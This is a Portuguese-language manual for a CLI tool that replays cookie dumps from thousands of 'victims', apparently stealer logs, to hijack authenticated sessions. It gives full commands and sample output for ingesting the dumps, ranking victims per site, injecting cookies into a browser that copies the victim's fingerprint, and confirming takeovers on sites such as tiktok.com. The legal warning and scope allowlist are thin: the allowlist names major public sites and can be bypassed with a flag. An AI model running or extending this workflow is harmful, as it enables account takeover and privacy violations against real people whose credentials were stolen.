# CookieMonster — Manual de Uso

Ferramenta CLI de **assessment de session hijacking** por cookie replay. Este manual cobre instalação, configuração e uso em ambiente de laboratório.

> **Aviso legal**: Use somente contra alvos com **autorização explícita** (pentest contratado, bug bounty, laboratório próprio). A ferramenta recusa alvos fora da allowlist local (`scope.txt`).

---

## 1. Conceito em 30 segundos

Você tem um dump de cookies (de uma máquina comprometida, de um dump de navegador, de uma captura de rede). Quer saber se ainda pode **reproduzir uma sessão autenticada** em um site usando esses cookies.

O CookieMonster responde em 4 estados:

| Estado | Significado |
|---|---|
| `CONFIRMED` | O servidor reconheceu os cookies e exibiu área logada (evidência forte) |
| `LIKELY` | Sinais parciais de sessão autenticada (ex.: UI com elementos logados) |
| `ANONYMOUS` | O servidor rejeitou os cookies e redirecionou para login |
| `UNKNOWN` | Evidência insuficiente (challenge JS, página em branco, etc.) |

> A ferramenta **nunca declara CONFIRMED sem evidência sólida** (login-redirect ausente + identity diferencial + UI autenticada). Um `UNKNOWN` não é falha — é o resultado conservador correto.

---

## 2. Instalação

### 2.1 Requisitos

- **Python 3.11+** (testado em 3.14)
- **Playwright + Chromium** (apenas se for usar o canal Playwright)
- **Git** (opcional, para clonar)

### 2.2 Setup (Windows / PowerShell)

```powershell
# Clone
git clone https://github.com/skzun/CookieMonster.git
cd CookieMonster

# Instale o pacote em modo editável
pip install -e .

# Instale o Chromium para o Playwright (uma vez)
python -m playwright install chromium

# Crie um venv se preferir (recomendado em ambiente corporativo)
python -m venv .venv
.\.venv\Scripts\activate
pip install -e .
python -m playwright install chromium
```

### 2.3 Setup (Linux / macOS)

```bash
git clone https://github.com/skzun/CookieMonster.git
cd CookieMonster
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
python -m playwright install chromium
```

### 2.4 Verificação

```bash
python -m cookiemonster --version
python -m cookiemonster --help
```

Saída esperada (acento pode aparecer corrompido em terminais cp1252 — é só visual):

```
Usage: python -m cookiemonster [OPTIONS] COMMAND [ARGS]...

  CookieMonster — validador de session hijacking por cookie replay.

Commands:
  best         Seleciona as melhores vítimas para um domínio
  check        [M3] Valida se o session hijack teve sucesso
  check-batch  Testa as N melhores vítimas em lote
  cookies      Lista cookies aplicáveis (matching RFC 6265)
  domains      Lista domínios e contagem de cookies
  edit         Altera o valor de um cookie (replay de artefato)
  ingest       Ingere dumps de cookies no store SQLite
  inject       Injeta os cookies num contexto de requisição
  report       Consolida runs+findings em console, JSON e Markdown
  victims      Lista as vítimas ingeridas
```

---

## 3. Configuração de Escopo (`scope.txt`)

**Importante**: o CookieMonster tem um **scope guardrail fail-safe**. Sem configuração, **todos os alvos são recusados**.

Edite `scope.txt` e liste os domínios autorizados (um por linha):

```
# Laboratorio local
127.0.0.1
localhost

# Alvos de teste autorizados
amazon.com
github.com
mycompany-lab.test
```

Para desabilitar o guardrail (somente em ambiente controlado), use `--allow-unsafe-scope` no comando. **Não recomendado**.

---

## 4. Workflow Básico

O fluxo típico é:

```
ingest  →  best  →  cookies  →  inject  →  check  →  report
```

Vou usar como exemplo o dataset `Cookies/` que vem no projeto (3.307 vítimas, 9.281.414 cookies de agosto/2026).

### 4.1 Ingestão (`ingest`)

Carrega os arquivos `.txt` (Netscape/curl) e `.json` (extensões de navegador) na pasta `Cookies/` para um store SQLite.

```bash
# Ingestão completa (~40 min para 9M cookies)
python -m cookiemonster ingest --dir Cookies --db store.db

# Retomada: pula vítimas já ingeridas
python -m cookiemonster ingest --dir Cookies --db store.db --resume

# Para teste rápido: primeiras 10 vítimas
python -m cookiemonster ingest --dir Cookies --db store.db --sample 10 --resume
```

**Saída esperada:**

```
Ingerindo dumps de cookies...
[200/3307] cookies=535463 arquivos=865 pulados=0 erros=0
[400/3307] cookies=1034835 arquivos=1626 pulados=0 erros=0
[3307/3307] cookies=9281414 arquivos=14269 pulados=0 erros=0

     Ingestão concluída
┌────────────────────┐
│ Item            │   Valor   │
│ victims         │    3307   │
│ files           │   14269   │
│ json files      │     249   │
│ cookies         │ 9281414   │
│ malformed lines │     212   │
│ pulados         │       0   │
│ erros           │       0   │
└────────────────────┘
```

> **Nota técnica**: O ingest deteta automaticamente o formato (Netscape/JSON) pelo conteúdo. Formatos suportados: Netscape/curl (tab-separado), JSON de extensão de navegador, e arquivos `.txt` que contêm JSON embutido.

### 4.2 Verificando Vítimas (`victims`)

```bash
python -m cookiemonster victims --db store.db
```

**Saída:**

```
                          Vítimas
┌──────┬────────────────────────────────────┬──────────────┬─────────┬─────────┐
│   ID │ Diretório                          │ Layout       │ Cookies │ Domínios│
├──────┼────────────────────────────────────┼──────────────┼─────────┼─────────┤
│    1 │ BDHVR451O96F8TGWDJJEWUU45CH04XHOS.. │ Cookies      │    109  │    52   │
│  201 │ IN67LASNZYN8IQMFFWFQYUDJN5MNKD1HI.. │ Browser/Cookies│   33  │    18   │
└──────┴────────────────────────────────────┴──────────────┴─────────┴─────────┘
Total: 3307 vítimas
```

### 4.3 Selecionar Melhores Vítimas para um Domínio (`best`)

Para um domínio alvo (ex.: `github.com`), o `best` retorna as vítimas que têm mais artefatos auth naquele domínio.

```bash
python -m cookiemonster best --db store.db --domain github.com --limit 5
```

**Saída:**

```
                  Melhores vítimas para github.com
┌────────┬──────────────────────────────────────┬──────┬───────┐
│Victim ID│ Diretório                            │ Auth │ Total │
├────────┼──────────────────────────────────────┼──────┼───────┤
│  1456  │ IN67LASNZYN8IQMFFWFQYUDJN5MNKD1HI_... │  10  │  33   │
│  3039  │ ...                                   │  10  │  29   │
│  1498  │ ...                                   │  10  │  25   │
└────────┴──────────────────────────────────────┴──────┴───────┘
```

> **Heurística**: `auth` conta cookies cujo nome é candidato a artefato auth (sessão, token, __Host-*, etc.). Quanto maior, maior a chance de ter uma sessão válida.

### 4.4 Listar Cookies Aplicáveis (`cookies`)

Mostra os cookies da vítima que **de fato casam** com o alvo (matching RFC 6265 — domain, path, secure, expiração).

```bash
python -m cookiemonster cookies --db store.db --victim 1456 --domain github.com --scheme https --limit 30
```

**Saída (resumo):**

```
                          Cookies — vítima 1456 — https://github.com/
┌────────────────┬─────────────┬──────┬────────┬──────────┬──────────┬────────────┐
│ Nome           │ Domínio     │ Path │ Secure │ HttpOnly │ HostOnly │   Expira   │
├────────────────┼─────────────┼──────┼────────┼──────────┼──────────┼────────────┤
│ _octo          │ .github.com │  /   │  yes   │   yes    │    -     │ 1791117386 │
│ logged_in      │ .github.com │  /   │  yes   │   yes    │    -     │ 1791117386 │
│ dotcom_user    │ .github.com │  /   │  yes   │   yes    │    -     │ 1811829246 │
│ _device_id     │ github.com  │  /   │  yes   │   yes    │   yes    │ 1812284446 │
│ saved_user_s.. │ github.com  │  /   │  yes   │   yes    │   yes    │ 1788069246 │
│ __Host-user_s..│ github.com  │  /   │  yes   │   yes    │   yes    │ 1781962106 │
└────────────────┴─────────────┴──────┴────────┴──────────┴──────────┴────────────┘
Total: 18 cookies aplicáveis
```

**Colunas-chave:**

- **HttpOnly** com `yes` (JSON parseado) ou `?` (Netscape — formato não traz o atributo).
- **HostOnly** `yes` indica cookie de domínio exato; `-` indica cookie compartilhado (subdomínios).
- **Expira** em epoch; `sessão` significa cookie de sessão (expira=0).

### 4.5 Injetar Cookies (`inject`)

Abre o navegador real (Playwright) ou faz requisição HTTP (httpx), injeta os cookies e navega para o alvo.

```bash
# Playwright (canal canônico — executa JS, navega para rota protegida)
python -m cookiemonster inject \
  --db store.db --victim 1456 --domain github.com \
  --url https://github.com --channel playwright

# Com screenshot para evidência
python -m cookiemonster inject \
  --db store.db --victim 1456 --domain github.com \
  --url https://github.com --channel playwright --screenshot reports
```

**Saída:**

```
18 cookies aplicáveis; canal=playwright
status=200
final=https://github.com/login?return_to=https%3A%2F%2Fgithub.com%2Fsettings%2Fprofile
Enviados ao alvo (9): _device_id, _gh_sess, _octo, color_mode, cpu_bucket, logged_in, preferred_color_mode, tz
Não enviados (9): GHCC, MSFPC, MicrosoftApplicationsTelemetryDeviceId, ...
```

**Como interpretar:**

- `final_url=/login?return_to=...` = a sessão foi rejeitada → servidor redirecionou.
- `Enviados ao alvo` = cookies que o browser efetivamente carregou (cookie_jar).
- `Não enviados` = cookies que não passaram o matcher (expirados ou path/secure inadequado).

### 4.6 Validar Sessão (`check`)

O comando **central** da ferramenta. Combina `inject` em modo baseline (sem cookies) + injetado (com cookies), compara via detector diferencial e classifica o estado.

```bash
# Modo canônico (Playwright + readiness condicional)
python -m cookiemonster check \
  --db store.db --victim 1456 --domain github.com \
  --channel playwright --max-wait-ms 8000
```

**Saída:**

```
check vítima=1456 https://github.com/ [18 cookies aplicáveis, canal=playwright]

ANONYMOUS (confianca 0.85, perfil github)
  sinais injetado: login_redirect
  diferencial: login_redirect: base=False inj=True | body_delta=742 | runtime: console_errors=0/1
  Artefatos (score)
┌─────────────────┬──────┬─────────┬──────────┬────────┬──────────┬───────┐
│ Cookie          │ Tipo │ Enviado │ HttpOnly │ Secure │ SameSite │ Score │
├─────────────────┼──────┼─────────┼──────────┼────────┼──────────┼───────┤
│ _octo           │ auth │   yes   │    ?     │  yes   │ unknown  │  10   │
│ logged_in       │ auth │   yes   │    ?     │  yes   │ unknown  │  10   │
│ _device_id      │ auth │   yes   │    ?     │  yes   │ unknown  │  10   │
│ ...
```

**Estrutura da saída:**

- **Cabeçalho**: estado (`ANONYMOUS`) + confiança (0.85) + perfil usado (`github`).
- **`sinais injetado`**: marcadores fortes extraídos da resposta (api_auth, login_redirect, ui_auth, etc.).
- **`diferencial`**: comparação baseline × injetado (`login_redirect: base=False inj=True` significa que o injetado redirecionou, mas o baseline não).
- **`runtime`**: console_errors e request_failures do injetado (delta em relação ao baseline).
- **Tabela de artefatos**: cookies aplicados com score e atributos.

### 4.7 Relatório Consolidado (`report`)

Gera matriz por domínio + JSON + Markdown:

```bash
python -m cookiemonster report --db store.db --out reports
```

**Saída (resumo):**

```
                              Resumo por domínio
┌───────────────────────────┬──────┬───────────┬────────┬───────────┬─────────┐
│ Domínio                   │ Runs│CONFIRMED  │ LIKELY │ ANONYMOUS │ UNKNOWN │
├───────────────────────────┼──────┼───────────┼────────┼───────────┼─────────┤
│ github.com                │   5 │       0   │   0    │     5     │   0     │
│ amazon.com                │   2 │       0   │   0    │     1     │   1     │
│ tiktok.com                │   1 │       1   │   0    │     0     │   0     │
│ chatgpt.com               │   1 │       0   │   1    │     0     │   0     │
│ ...
└───────────────────────────┴──────┴───────────┴────────┴───────────┴─────────┘

Relatórios gerados em reports/
```

Arquivos gerados:

- `reports/report.json` — runs + findings + evidências (atomic write).
- `reports/report.md` — sumário legível.
- `reports/victim_<id>_<host>_baseline.png` / `_injected.png` — screenshots Playwright.

### 4.8 Workflow Completo — Resumo

```bash
# Setup (uma vez)
pip install -e .
python -m playwright install chromium

# Cada sessão de uso
python -m cookiemonster ingest --dir Cookies --db store.db --resume

python -m cookiemonster best --db store.db --domain github.com --limit 5
python -m cookiemonster cookies --db store.db --victim 1456 --domain github.com --scheme https

python -m cookiemonster check \
  --db store.db --victim 1456 --domain github.com \
  --channel playwright --max-wait-ms 8000

python -m cookiemonster report --db store.db --out reports
```

---

## 5. Workflow Avançado

### 5.1 Batch (`check-batch`)

Roda `check` em sequência para as **N melhores vítimas** de um domínio. Útil para descobrir se **alguma** das capturas ainda tem sessão válida.

```bash
python -m cookiemonster check-batch \
  --db store.db --domain github.com --limit 5 --channel playwright
```

> Use `--channel httpx` para batch rápido (sem browser, baixa fidelidade); use `playwright` para resultados definitivos.

### 5.2 Teste de Fixação (`edit` + `check`)

Reproduz o cenário clássico de **session fixation**:
1. Captura o cookie `session` original.
2. Edita para um valor arbitrário/expira.
3. Re-roda `check` para verificar se o servidor aceita.

```bash
# 1) Captura valor original
python -m cookiemonster cookies --db store.db --victim 1456 --domain github.com --limit 30

# 2) Edita _octo para um valor arbitrário
python -m cookiemonster edit --db store.db --victim 1456 --domain github.com --cookie _octo --value "FAKE_VALUE"

# 3) Re-roda check — o servidor deve rejeitar
python -m cookiemonster check --db store.db --victim 1456 --domain github.com --channel playwright

# 4) Restaura valor original
python -m cookiemonster edit --db store.db --victim 1456 --domain github.com --cookie _octo --value "GH1.1.477220690.1759581401"
```

> **Uso avançado**: edite **um cookie por vez** e observe o efeito na autenticação. Se um único cookie editado invalida a sessão, ele é o artefato auth crítico (e está sendo validado pelo servidor).

### 5.3 Diferença entre Canais (`httpx` vs `playwright`)

| Aspecto | `httpx` | `playwright` |
|---|---|---|
| Velocidade | ~1-2 s por check | ~5-10 s por check |
| Executa JavaScript | Não | Sim |
| Bypassa bot detection | Não | Parcial |
| Captura `redirect_chain` | Básico | Completo |
| `cookie_jar` preciso | Não | Sim |
| Fidelity da sessão | Baixa | Alta |

**Regra prática**:
- Use `httpx` em batch (descoberta inicial, dezenas de vítimas).
- Use `playwright` para validação final das vítimas mais promissoras.

### 5.4 Modos de Replay (`--replay-mode`)

| Modo | Comportamento | Quando usar |
|---|---|---|
| `strict` (padrão) | Preserva fingerprint do dump (UA/locale/timezone) | **Padrão — sempre** |
| `browser_default` | UA/locale/timezone neutros | Diagnóstico (fingerprint independente) |
| `randomized` | Aleatoriza tudo | **Apenas para detectar fingerprinting** (quebra sessão por bind) |

> **Importante**: randomizar a fingerprint **invalida sessões legítimas** que fazem bind de IP/UA. Só use `randomized` para detectar servidores que validam fingerprint.

### 5.5 Modos de Replay — Max Wait

`--max-wait-ms` controla quanto tempo o Playwright espera pela aplicação indicar "pronto" (via DOM selectors e/ou endpoints de identidade).

```bash
# Conservador (rápido, pode perder sinal em SPA lentas)
python -m cookiemonster check --max-wait-ms 4000 ...

# Padrão (recomendado)
python -m cookiemonster check --max-wait-ms 8000 ...

# Paciente (SPAs com fetch assíncrono pesado)
python -m cookiemonster check --max-wait-ms 15000 ...
```

### 5.6 Perfil de Site

A ferramenta tem perfis embutidos para detectar marcadores específicos:

- **github**: settings/profile, dashboard, "Your repositories"
- **amazon**: nav-link-accountList, "Sign Out", "Your Account"
- **spotify**: your-library, v1/me
- **steamcommunity**: g_steamID, steamLoginSecure
- **netflix**: BobContext, ProfileSelector
- **generic** (default): logout, sign out, dashboard, my account

Perfis customizados podem ser registrados em Python:

```python
from cookiemonster.validate.profiles import (
    SiteProfile, register_profile,
)
class MyAppProfile(SiteProfile):
    name = "myapp"
    identity_endpoints = ("/api/me",)
    authenticated_selectors = ('[data-test="user-menu"]',)
    strong_auth_markers = ("logout",)
register_profile("myapp.com", MyAppProfile())
```

---

## 6. Interpretando Resultados

### 6.1 CONFIRMED

**Quando aparece**: o servidor aceitou os cookies e exibiu área logada, evidenciado por:

- Identidade diferencial no injetado (nome, email, account_id) ausente no baseline.
- Endpoint de identidade respondeu `200 OK` com JSON de identidade.
- Rotação de sessão detectada (cookie novo).

**Confiança típica**: 0.85 a 0.95.

**Exemplo real**: tiktok.com com vid 2390 — o servidor aceitou os cookies de agosto/2026.

> **Importante**: CONFIRMED **não significa conta comprometida com certeza**. Significa que o servidor reconheceu os cookies como uma sessão válida. A sessão pode ter bind de IP/UA/device que você não reproduziu; um segundo teste pode dar outro resultado.

### 6.2 LIKELY

**Quando aparece**: sinais parciais de sessão autenticada, mas sem identidade confirmada.

- Markers fortes no DOM que não apareciam no baseline (`Logout`, `My Account`).
- API retornou 200 mas com payload genérico (não identificou usuário).

**Confiança típica**: 0.6 a 0.7.

**Exemplo real**: chatgpt.com com vid 1939 — UI autenticada mas identidade não pôde ser extraída.

### 6.3 ANONYMOUS

**Quando aparece**: o servidor rejeitou explicitamente os cookies.

- `redirect-to-login` no injetado (301/302 para `/login`).
- `api_anon_status` 401/403 em endpoint de identidade.
- `signin-redirect` específico de sites (ex.: Amazon `/ap/signin`).

**Confiança típica**: 0.85.

**Exemplo real**: github.com — todos os cookies testados em agosto/2026 resultaram em redirect para `/login` ao acessar `/settings/profile`. A sessão expirou ou foi invalidada.

### 6.4 UNKNOWN

**Quando aparece**: evidência insuficiente para classificar.

**Causas comuns**:

| Causa | Como detectar |
|---|---|
| Cookies expiraram (expires no passado) | `cookies` mostra `Expira` no passado |
| Servidor retornou challenge JS (Cloudflare) | `request_failures` alto, sem redirect-login |
| Bind de IP/UA falhou | Tente `--replay-mode browser_default` para isolar |
| Aplicação não usa redirect-login (SPA única) | Tente aumentar `--max-wait-ms` |
| Cookies enviados mas servidor não diferencia | `diferencial: login_redirect: base=False inj=False` |

**Ação recomendada**: investigue o `UNKNOWN_REASON` na saída e ajuste a estratégia.

### 6.5 UNKNOWN_REASON — Detalhes

Saída indica **por que** o resultado foi UNKNOWN:

```
UNKNOWN_REASON: cliente httpx (sem probe estruturado)
UNKNOWN_REASON: sem diferenca significativa (cookies aceitos mas UI/API nao distinguem baseline de injetado)
UNKNOWN_REASON: js_errors (frontend quebrou)
UNKNOWN_REASON: request_failures (rede bloqueada/bot challenge)
UNKNOWN_REASON: api_anon_status (401/403 sem login_redirect explicito)
UNKNOWN_REASON: login_redirect (servidor redirecionou)
```

---

## 7. Troubleshooting

### "Recusado: alvo fora da allowlist"

Adicione o domínio em `scope.txt` ou use `--allow-unsafe-scope`.

### "Nenhum cookie aplicável"

O matcher RFC 6265 não encontrou cookies que casem com a URL. Verifique:
- Domínio dos cookies vs. URL alvo.
- Schema (http/https) e atributo `secure`.
- Path (cookie com path `/api` não casa com `/`).

Use `python -m cookiemonster cookies --victim <id> --domain <dom> --scheme <http|https>` para inspecionar.

### Playwright falha com timeout

Aumente `--max-wait-ms`. Para SPAs muito lentas, tente `--max-wait-ms 15000` ou `--max-wait-ms 20000`.

### "missing field `evidence`" no JSON

Recrie o `store.db` com `python -m cookiemonster ingest --resume` (deleta + re-insere). O problema é schema antigo sem a coluna `evidence_json` em `runs`.

### Erros de Unicode no Windows Terminal

É só visual (o cp1252 não tem certos glifos). Os dados no store estão UTF-8 corretamente. Use `python -m cookiemonster ... | Out-File -Encoding utf8` para output UTF-8.

### Public Suffix List falhou

O `util/psl.py` baixa a PSL com cache local. Se a rede estiver bloqueada, o fallback hardcoded é usado. Para forçar refresh: delete `%USERPROFILE%\.cache\cookiemonster\public_suffix_list.dat`.

### `cookies.json` JSON dentro de arquivos `.txt`

A ferramenta detecta automaticamente o conteúdo JSON mesmo em arquivos com extensão `.txt`. Você verá `json files: N` no relatório de ingest.

---

## 8. Referência de Comandos

### 8.1 `ingest`

```
python -m cookiemonster ingest [OPTIONS]

  --dir DIRECTORY   Pasta raiz com subpastas de vítima (obrigatório)
  --db PATH          Caminho do store SQLite (padrão: store.db)
  --sample INTEGER   Limita às N primeiras vítimas
  --resume           Pula vítimas já ingeridas
```

### 8.2 `victims`

```
python -m cookiemonster victims --db PATH
```

### 8.3 `domains`

```
python -m cookiemonster domains --db PATH [--victim ID] [--domain TEXT]
```

### 8.4 `best`

```
python -m cookiemonster best --db PATH --domain TEXT [--limit N]
```

### 8.5 `cookies`

```
python -m cookiemonster cookies --db PATH --victim ID --domain TEXT
                                [--scheme https|http] [--path TEXT] [--limit N] [--show-value]
```

### 8.6 `inject`

```
python -m cookiemonster inject --db PATH --victim ID --domain TEXT --url TEXT
                              [--channel playwright|httpx]
                              [--path TEXT] [--screenshot PATH]
                              [--replay-mode strict|browser_default|randomized]
                              [--allow-unsafe-scope]
```

### 8.7 `check`

```
python -m cookiemonster check --db PATH --victim ID --domain TEXT
                            [--url TEXT] [--channel playwright|httpx]
                            [--path TEXT] [--screenshot PATH]
                            [--replay-mode ...] [--max-wait-ms N]
                            [--allow-unsafe-scope]
```

### 8.8 `check-batch`

```
python -m cookiemonster check-batch --db PATH --domain TEXT
                                  [--limit N] [--channel playwright|httpx]
                                  [--allow-unsafe-scope]
```

### 8.9 `edit`

```
python -m cookiemonster edit --db PATH --victim ID --domain TEXT --cookie NAME --value TEXT
```

### 8.10 `report`

```
python -m cookiemonster report --db PATH --out DIRECTORY
```

---

## 9. Estrutura do Projeto

```
CookieMonster/
├── cookiemonster/         # pacote principal
│   ├── ingest/            # parser Netscape/JSON + orchestrator
│   ├── store/             # SQLite store (schema + db)
│   ├── domain/            # RFC 6265 matcher + auth heuristics
│   ├── inject/            # replay via httpx + Playwright + AuthProbe
│   ├── validate/          # detector diferencial + perfis de site
│   ├── report/            # console + JSON + Markdown
│   ├── util/              # PSL, stealth, rate limit, scope guardrail
│   └── cli.py             # Click commands
├── lab/                   # mock server (Python puro) + smoke scripts
├── tests/                 # 68 testes pytest
├── reports/               # saída dos relatórios
├── Cookies/               # (gitignored) dumps de cookies de teste
├── store.db               # (gitignored) SQLite gerado pelo ingest
├── scope.txt              # allowlist de escopo
├── ROADMAP.md             # roadmap M0–M5
├── CHANGELOG.md           # histórico de versões
├── docs/
│   ├── ARCHITECTURE.md    # arquitetura técnica
│   └── MANUAL.md          # este arquivo
└── pyproject.toml         # dependências e entry point
```

---

## 10. Onde Pedir Ajuda

- **Issues**: https://github.com/skzun/CookieMonster/issues
- **Documentação adicional**: `docs/ARCHITECTURE.md` (técnica), `ROADMAP.md` (roadmap), `CHANGELOG.md` (histórico)
- **Lab mock**: `lab/mock_app.py` para testar offline sem rede real